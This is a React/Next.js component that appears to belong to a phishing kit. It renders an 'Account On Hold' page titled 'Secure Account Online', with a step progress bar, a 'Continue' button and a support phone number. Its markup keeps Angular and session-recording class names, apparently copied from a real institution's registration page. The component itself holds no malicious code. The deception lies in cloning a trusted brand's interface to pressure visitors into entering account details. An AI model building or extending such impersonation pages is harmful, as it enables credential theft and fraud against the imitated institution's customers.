import Head from "next/head";
import React from "react";
import useMediaQuery from "../hooks/useMediaQuery";
import { getProgress } from "../utils/getProgress";
import { getProgressText } from "../utils/getProgressText";
import { Wrapper } from "./Wrapper";

interface ContainerProps {
  children?: React.ReactNode;
  loading?: boolean;
  onSubmit?: React.MouseEventHandler<HTMLButtonElement> | undefined;
  buttonText?: string;
  title?: string;
  subTitle?: string;
  step?: string;
  hideBtn?: boolean;
}

export const Container: React.FC<ContainerProps> = ({
  children,
  loading,
  onSubmit,
  buttonText,
  title,
  subTitle,
  hideBtn,
  step,
}) => {
  const isMobile = useMediaQuery(`(max-width: 767.98px)`);
  return (
    <Wrapper>
      <Head>
        <title>Secure Account Online</title>
        <link href="/favicon.ico" />
      </Head>
      <span className="registration-component ng-star-inserted">
        {/**/}
        <div className="container px-4 px-md-2 ng-star-inserted">
          <div className="row justify-content-center my-3 my-md-5">
            <div className="col-12 col-md-11 col-lg-10 stepper-container">
              {/* <a className="btn-icon-link icon-lg" href="/login">
          <i aria-hidden="true" className="material-icons">
            arrow_back
          </i>{" "}
          Back to Login{" "}
        </a> */}
              <h2 className="mt-4 mb-5">{title || `Account On Hold`}</h2>
              {/**/}
              <div className="stepper-component ng-star-inserted">
                <div className="stepper-component-header ng-star-inserted mobile-sticky">
                  {getProgress().map((progress, index) => (
                    <div
                      key={progress}
                      className={`step-component ${
                        progress === step ? `active` : ``
                      }`}
                    >
                      <div className="step-number">{index + 1}</div>
                      <div className="step-label">
                        {getProgressText(progress)}
                      </div>
                      {/**/}
                    </div>
                  ))}

                  <div
                    className="progress-bg-line"
                    style={{ width: 58.5 * getProgress().length }}
                  />
                  <div className="progress-line" style={{ width: 0 }} />
                  <div
                    className="progress-bg-line mobile"
                    style={{ width: "calc(75%)" }}
                  />
                  <div
                    className="progress-line mobile"
                    style={{ width: "calc(0%)" }}
                  />
                </div>
                {/**/}
                <div className="step-content-wrapper">
                  <div className="ng-star-inserted">
                    <form className="ng-pristine ng-invalid ng-touched">
                      <p className="color-gray-800 sm-text mb-3">
                        {/**/}
                        {/**/}
                        {/**/}
                        {/**/}
                      </p>
                      <div className="row">
                        {/* <div className="col-md-4 ng-star-inserted"></div> */}
                        {children}
                      </div>
                      {hideBtn ? null : (
                        <div className="buttons mt-2">
                          <div
                            tabIndex={-1}
                            style={
                              isMobile
                                ? {
                                    display: "flex",
                                    justifyContent: "center",
                                    marginBottom: "1.125rem",
                                  }
                                : {}
                            }
                          >
                            <button
                              type="submit"
                              className="btn-primary fs-unmask"
                              onClick={onSubmit}
                              disabled={loading}
                              style={{
                                display: "inline-flex",
                                alignItems: "center",
                                verticalAlign: "middle",
                                justifyContent: "center",
                                textDecoration: "none",
                                whiteSpace: "nowrap",
                                border: "3px solid transparent",
                                padding: "0.4375rem 2.3125rem",
                                borderRadius: "var(--btn-border-radius)",
                                lineHeight: "1.5",
                                transition: "all .25s ease",
                                ...(isMobile
                                  ? {
                                      width: "100%",
                                      padding: "0.6875rem 2.75rem",
                                    }
                                  : {}),
                                ...(loading
                                  ? {
                                      background: "var(--gray-300)",
                                      boxShadow: "0 0 0 1px var(--gray-300)",
                                    }
                                  : {}),
                              }}
                            >
                              {/**/}
                              {loading ? (
                                <span
                                  className="logging-loader"
                                  style={{
                                    marginRight: 5,
                                  }}
                                />
                              ) : null}
                              {/**/} {loading ? `Continuing...` : `Continue`}{" "}
                            </button>
                          </div>
                        </div>
                      )}
                      <div>
                        <div className="row mt-4 mt-md-5">
                          <div className="col-12 d-flex justify-content-center">
                            <i
                              aria-hidden="true"
                              className="material-icons"
                              style={{
                                alignSelf: "center",
                                color: "var(--gray-800)",
                                fontSize: "26px",
                                marginRight: "12px",
                              }}
                            >
                              forum
                            </i>
                            <div className="color-gray-800">
                              <span>Need more assistance? </span>
                              {isMobile ? <br /> : null}
                              <span>
                                Call{" "}
                                <a
                                  href="tel:800.991.2221"
                                  className="link-gray no-underline"
                                >
                                  800.991.2221
                                </a>
                              </span>
                              {/**/}
                            </div>
                          </div>
                        </div>
                      </div>
                    </form>
                  </div>
                  {/**/}
                  {/**/}
                </div>
              </div>
              {/**/}
            </div>
          </div>
        </div>
        {/**/}
      </span>
    </Wrapper>
  );
};
